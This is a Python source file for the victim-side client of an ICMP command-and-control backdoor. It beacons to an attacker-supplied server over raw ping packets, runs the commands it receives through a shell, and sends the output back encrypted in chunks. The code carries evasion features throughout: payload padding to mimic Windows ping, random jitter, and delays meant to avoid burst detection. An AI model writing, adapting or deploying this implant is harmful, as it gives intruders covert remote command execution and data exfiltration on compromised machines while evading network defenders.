#!/usr/bin/env python3
"""
ICMP C2 Client (Victim)
Usage: sudo python3 client.py --server 1.2.3.4 --key mysecretpass
       sudo python3 client.py --server 1.2.3.4 --key mysecretpass --chunk 128 --padding 192
"""

import socket
import struct
import subprocess
import time
import os
import sys
import argparse
import hashlib
import random
import hmac

# ===== Crypto =====

class SecureCipher:
    def __init__(self, password: str):
        master = hashlib.sha256(password.encode()).digest()
        self.enc_key  = hmac.new(master, b"enc",  hashlib.sha256).digest()
        self.auth_key = hmac.new(master, b"auth", hashlib.sha256).digest()

    def _keystream(self, iv: bytes, length: int) -> bytes:
        out = bytearray()
        counter = 0
        while len(out) < length:
            block = hmac.new(
                self.enc_key,
                iv + struct.pack("<Q", counter),
                hashlib.sha256
            ).digest()
            out.extend(block)
            counter += 1
        return bytes(out[:length])

    def _mac(self, iv: bytes, ciphertext: bytes) -> bytes:
        return hmac.new(self.auth_key, iv + ciphertext, hashlib.sha256).digest()

    def encrypt(self, plaintext: bytes) -> bytes:
        iv  = os.urandom(16)
        ks  = self._keystream(iv, len(plaintext))
        ct  = bytes(a ^ b for a, b in zip(plaintext, ks))
        tag = self._mac(iv, ct)
        return iv + ct + tag

    def decrypt(self, data: bytes):
        if len(data) < 48:
            return None
        iv  = data[:16]
        tag = data[-32:]
        ct  = data[16:-32]
        if not hmac.compare_digest(self._mac(iv, ct), tag):
            return None
        ks = self._keystream(iv, len(ct))
        return bytes(a ^ b for a, b in zip(ct, ks))


# ===== ICMP =====

MAGIC          = b'\xDE\xAD'
MSG_POLL       = 0x01
MSG_OUTPUT     = 0x02
MSG_CMD        = 0x03
MSG_NOP        = 0x04
MSG_ACK        = 0x05

ICMP_ECHO_REQUEST = 8
ICMP_ECHO_REPLY   = 0


def checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b'\x00'
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF


def build_icmp_request(icmp_id: int, icmp_seq: int, payload: bytes) -> bytes:
    header = struct.pack("!BBHHH", ICMP_ECHO_REQUEST, 0, 0, icmp_id, icmp_seq)
    cksum  = checksum(header + payload)
    header = struct.pack("!BBHHH", ICMP_ECHO_REQUEST, 0, cksum, icmp_id, icmp_seq)
    return header + payload


def parse_icmp_reply(raw: bytes):
    ip_hdr_len = (raw[0] & 0x0F) * 4
    icmp_data  = raw[ip_hdr_len:]
    if len(icmp_data) < 8:
        return None
    icmp_type, _, _, icmp_id, icmp_seq = struct.unpack("!BBHHH", icmp_data[:8])
    payload = icmp_data[8:]
    return icmp_type, icmp_id, icmp_seq, payload


def make_payload(msg_type: int, data: bytes, cipher: SecureCipher,
                 pad_to: int = 0) -> bytes:
    encrypted = cipher.encrypt(data)
    raw = MAGIC + struct.pack("B", msg_type) + encrypted
    if pad_to > 0 and len(raw) < pad_to:
        raw += os.urandom(pad_to - len(raw))
    return raw


def parse_payload(payload: bytes, cipher: SecureCipher):
    if len(payload) < 3 or payload[:2] != MAGIC:
        return None
    msg_type  = payload[2]
    encrypted = payload[3:]
    for trim in range(0, len(encrypted), 1):
        end = len(encrypted) - trim
        if end < 48:
            return None
        result = cipher.decrypt(encrypted[:end])
        if result is not None:
            return msg_type, result
    return None


# ===== Network helpers =====

def resolve_host(host: str) -> str:
    try:
        return socket.gethostbyname(host)
    except socket.gaierror as e:
        print(f"[!] Cannot resolve {host}: {e}")
        sys.exit(1)


def send_and_receive(sock, server_ip: str, icmp_id: int, seq: int,
                     payload: bytes, cipher: SecureCipher,
                     timeout: float = 3.0, retries: int = 3):
    """
    Send ICMP Echo Request with retransmission.
    Returns (msg_type, data) or None.
    """
    for attempt in range(retries):
        pkt = build_icmp_request(icmp_id, seq, payload)
        try:
            sock.sendto(pkt, (server_ip, 0))
        except Exception as e:
            time.sleep(1)
            continue

        deadline = time.time() + timeout
        while time.time() < deadline:
            remaining = deadline - time.time()
            if remaining <= 0:
                break
            sock.settimeout(remaining)
            try:
                raw = sock.recvfrom(65535)[0]
            except socket.timeout:
                break
            except Exception:
                break

            parsed = parse_icmp_reply(raw)
            if not parsed:
                continue
            icmp_type, r_id, r_seq, r_payload = parsed
            if icmp_type != ICMP_ECHO_REPLY or r_id != icmp_id or r_seq != seq:
                continue

            result = parse_payload(r_payload, cipher)
            if result:
                return result
    return None


# ===== Command execution =====

def execute_command(cmd: str) -> str:
    try:
        result = subprocess.run(
            cmd, shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            timeout=30
        )
        output = result.stdout.decode(errors="replace")
        return output if output else "(no output)\n"
    except subprocess.TimeoutExpired:
        return "(command timed out)\n"
    except Exception as e:
        return f"(error: {e})\n"


# ===== Main =====

def main():
    parser = argparse.ArgumentParser(description="ICMP C2 Client")
    parser.add_argument("--server",   "-s", required=True,
                        help="Attacker IP or hostname")
    parser.add_argument("--key",      "-k", required=True,
                        help="Shared encryption key")
    parser.add_argument("--interval", "-i", type=float, default=2.0,
                        help="Beacon interval in seconds (default: 2)")
    parser.add_argument("--jitter",   "-j", type=float, default=0.5,
                        help="Max random jitter in seconds (default: 0.5)")
    parser.add_argument("--chunk",    "-c", type=int, default=512,
                        help="Output chunk size in bytes (default: 512). "
                             "Lower = more packets but smaller payloads.")
    parser.add_argument("--padding",  "-p", type=int, default=0,
                        help="Pad every ICMP payload to this size (bytes). "
                             "Use 56 to mimic Windows ping, 16 for minimal, "
                             "0 for no padding (default: 0).")
    parser.add_argument("--retries",  "-r", type=int, default=3,
                        help="Retransmit attempts per packet (default: 3)")
    parser.add_argument("--timeout",  "-t", type=float, default=3.0,
                        help="Reply timeout in seconds (default: 3)")
    parser.add_argument("--verbose",  "-v", action="store_true")
    args = parser.parse_args()

    cipher    = SecureCipher(args.key)
    server_ip = resolve_host(args.server)
    icmp_id   = os.getpid() & 0xFFFF
    seq       = 0
    pad       = args.padding
    chunk_sz  = args.chunk

    # Validate: padding must be large enough for the overhead
    # Overhead = MAGIC(2) + type(1) + IV(16) + TAG(32) = 51 bytes minimum
    MIN_OVERHEAD = 51
    if pad > 0 and pad < MIN_OVERHEAD:
        print(f"[!] --padding must be ≥ {MIN_OVERHEAD} or 0 (off). "
              f"Got {pad}.")
        sys.exit(1)

    max_data_per_chunk = (pad - MIN_OVERHEAD - 4) if pad > 0 else chunk_sz
    if pad > 0 and max_data_per_chunk < 1:
        print(f"[!] --padding {pad} too small for framing. "
              f"Minimum: {MIN_OVERHEAD + 5}")
        sys.exit(1)
    if pad > 0:
        chunk_sz = min(chunk_sz, max_data_per_chunk)
        if args.verbose:
            print(f"[v] Effective chunk size: {chunk_sz} bytes "
                  f"(fits in {pad}-byte padded payload)")

    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)

    stealth_info = f", padding={pad}B" if pad else ""
    print(f"[*] Beaconing → {server_ip}  "
          f"every {args.interval}s ± {args.jitter}s  "
          f"chunk={chunk_sz}B{stealth_info}")

    while True:
        try:
            seq = (seq + 1) % 65536
            poll_payload = make_payload(MSG_POLL, b"", cipher, pad)

            result = send_and_receive(
                sock, server_ip, icmp_id, seq, poll_payload, cipher,
                timeout=args.timeout, retries=args.retries)

            if not result:
                if args.verbose:
                    print("[v] No reply")
                time.sleep(args.interval + random.uniform(0, args.jitter))
                continue

            msg_type, data = result

            if msg_type == MSG_CMD:
                cmd = data.decode(errors="replace").strip()
                if args.verbose:
                    print(f"[v] CMD: {cmd}")

                if cmd.lower() == "exit":
                    print("[*] Exit received")
                    break

                output       = execute_command(cmd)
                output_bytes = output.encode()

                total_chunks = max(
                    1, (len(output_bytes) + chunk_sz - 1) // chunk_sz)

                for i in range(total_chunks):
                    offset = i * chunk_sz
                    chunk  = output_bytes[offset:offset + chunk_sz]
                    seq    = (seq + 1) % 65536

                    framing     = struct.pack("!HH", i, total_chunks)
                    out_payload = make_payload(
                        MSG_OUTPUT, framing + chunk, cipher, pad)

                    send_and_receive(
                        sock, server_ip, icmp_id, seq, out_payload, cipher,
                        timeout=args.timeout, retries=args.retries)

                    # Small inter-chunk delay to avoid burst detection
                    time.sleep(0.05 + random.uniform(0, 0.05))

            elif msg_type in (MSG_NOP, MSG_ACK):
                if args.verbose:
                    print("[v] NOP/ACK")

            jitter = random.uniform(0, args.jitter)
            time.sleep(args.interval + jitter)

        except KeyboardInterrupt:
            print("\n[*] Interrupted")
            break
        except Exception as e:
            print(f"[!] Error: {e}")
            time.sleep(args.interval)

    sock.close()


if __name__ == "__main__":
    main()
